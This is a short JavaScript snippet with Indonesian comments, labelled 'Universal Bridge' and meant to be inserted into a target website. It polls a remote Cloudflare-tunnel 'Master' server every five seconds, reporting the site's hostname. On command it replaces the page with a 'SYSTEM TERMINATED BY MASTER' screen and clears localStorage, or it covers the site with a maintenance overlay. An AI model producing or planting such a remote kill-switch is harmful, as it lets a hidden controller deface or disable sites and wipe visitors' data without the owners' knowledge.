/**
 * UNIVERSAL BRIDGE v1.0
 * Masukkan kode ini di <script> tag website target.
 * Hubungkan ke URL Tunnel Cloudflare Master kamu.
 */

const MASTER_CORE_URL = "URL_TUNNEL_CLOUDFLARE_KAMU_DI_SINI"; 
const NODE_ID = window.location.hostname;

async function syncWithMaster() {
    try {
        const response = await fetch(`${MASTER_CORE_URL}/sync-target?id=${NODE_ID}`);
        const data = await response.json();

        if (data.command === "WIPE") {
            console.warn("CRITICAL: WIPE COMMAND RECEIVED FROM MASTER.");
            document.body.innerHTML = `
                <div style="background:#000; color:#ff0000; height:100vh; display:flex; align-items:center; justify-content:center; font-family:monospace; text-align:center;">
                    <h1>[ SYSTEM TERMINATED BY MASTER ]<br>ACCESS REVOKED</h1>
                </div>`;
            // Opsional: Hapus localStorage/Cookies jika perlu
            localStorage.clear();
        } 
        
        else if (data.maintenance === true) {
            if (!document.getElementById('mt-overlay')) {
                const overlay = document.createElement('div');
                overlay.id = 'mt-overlay';
                overlay.innerHTML = "SERVER UNDER MASTER MAINTENANCE";
                overlay.style = "position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); color:white; z-index:999999; display:flex; align-items:center; justify-content:center; font-weight:bold;";
                document.body.appendChild(overlay);
            }
        } 
        
        else {
            const overlay = document.getElementById('mt-overlay');
            if (overlay) overlay.remove();
        }

    } catch (error) {
        console.log("Master Core unreachable...");
    }
}

// Polling setiap 5 detik untuk mengecek perintah baru dari Dashboard Developer
setInterval(syncWithMaster, 5000);

